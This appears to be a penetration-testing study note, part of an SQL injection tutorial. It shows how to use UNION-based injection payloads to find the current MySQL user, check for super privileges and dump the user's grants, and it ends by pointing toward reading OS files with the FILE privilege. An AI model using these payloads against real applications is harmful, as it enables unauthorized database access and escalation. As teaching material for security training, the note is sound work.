# User Privs
### DB User
First, we have to _determine which user we are within the database_. After that, we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
Our UNION injection payload will be as follows:
```
__Our UNION injection payload will be as follows:__
```sql
X' UNION SELECT 1, user(), 3, 4-- -
```
or:
```sql
X' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
> Which tells us our current user, which in this case is root:


<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f3b1f81b-d8cb-4153-837a-eed602bc4bee" width="600" alt="Sublime's custom image"/>
</p>

This is very promising, as a root user is likely to be a DBA, which gives us many privileges.

### User prileges.
Now that we know our user, we can __start looking for what privileges we have with that user__. 

#### Super admin privileges.
First of all, we can test if we have super admin privileges with the following query:
```sql
SELECT super_priv FROM mysql.user
```
Once again, we can use the following payload with the above query:
```sql
X' UNION SELECT 1, 2, super_priv, 4 FROM mysql.user -- -
```
If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
```sql
X' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d2055c73-a41f-48f6-bb8b-c619a424e098" width="600" alt="Sublime's custom image"/>
</p>

> The query returns `Y`, which __means YES, indicating superuser privileges__.

#### Dumping all user privileges.
We can also dump other privileges we have directly from the schema, with the following query:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
From here, we can add WHERE grantee="'root'@'localhost'" to only show our current user root privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
> And we see all of the possible privileges given to our current user: 

<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/89debdf6-abd0-44d7-b4e8-b30f6f95a88c" width="500" alt="Sublime's custom image"/>
</p>

> __We see that the `FILE` privilege is listed for our user__, __enabling us to read files and potentially even write files__. Thus, we can proceed with attempting to [read files](#reading-os-files).
